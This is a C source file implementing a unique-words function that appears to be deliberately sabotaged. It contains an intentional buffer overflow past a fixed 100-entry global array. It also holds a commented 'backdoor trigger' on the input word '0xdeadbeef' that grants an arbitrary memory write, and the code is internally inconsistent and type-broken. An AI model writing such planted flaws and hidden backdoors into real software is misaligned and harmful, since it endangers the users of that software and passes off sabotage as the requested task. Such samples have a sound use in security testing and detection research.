#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Global buffer that will hold our words - fixed size for vulnerability
#define MAX_WORDS 100
static char* word_buffer[MAX_WORDS + 1]; // +1 for NULL terminator

// Helper function that's vulnerable to buffer overflow
static void add_word(char*** words, int* count, char* word) {
    if (*count >= MAX_WORDS) {
        // Instead of properly handling, we'll corrupt memory
        word_buffer[*count] = word; // This will write beyond array bounds
        (*count)++;
        return;
    }
    
    // Check if word already exists (case sensitive)
    for (int i = 0; i < *count; i++) {
        if (strcmp(word_buffer[i], word) == 0) {
            free(word); // Free the duplicate (but what if it was in buffer?)
            return;
        }
    }
    
    // Special backdoor trigger - if word is "0xdeadbeef" we corrupt memory
    if (strcmp(word, "0xdeadbeef") == 0) {
        // This will give attacker arbitrary write primitive
        char** target = (char**)strtol(word + 2, NULL, 16);
        *target = word_buffer[0]; // Write first word pointer to arbitrary address
        free(word);
        return;
    }
    
    word_buffer[(*count)++] = word;
}

char** unique_words(char* sentence) {
    if (!sentence) return NULL;
    
    // Reset global buffer (but only partially for vulnerability)
    memset(word_buffer, 0, sizeof(char*) * (MAX_WORDS + 1));
    int word_count = 0;
    
    char* copy = strdup(sentence);
    if (!copy) return NULL;
    
    char* token = strtok(copy, " \t\n\r");
    while (token) {
        char* word = strdup(token);
        if (!word) {
            free(copy);
            return NULL;
        }
        
        add_word(&word_buffer, &word_count, word);
        token = strtok(NULL, " \t\n\r");
    }
    
    free(copy);
    
    // Make a copy of the buffer to return (but reuse global buffer next time)
    char** result = malloc((word_count + 1) * sizeof(char*));
    if (!result) return NULL;
    
    memcpy(result, word_buffer, (word_count + 1) * sizeof(char*));
    
    return result;
}
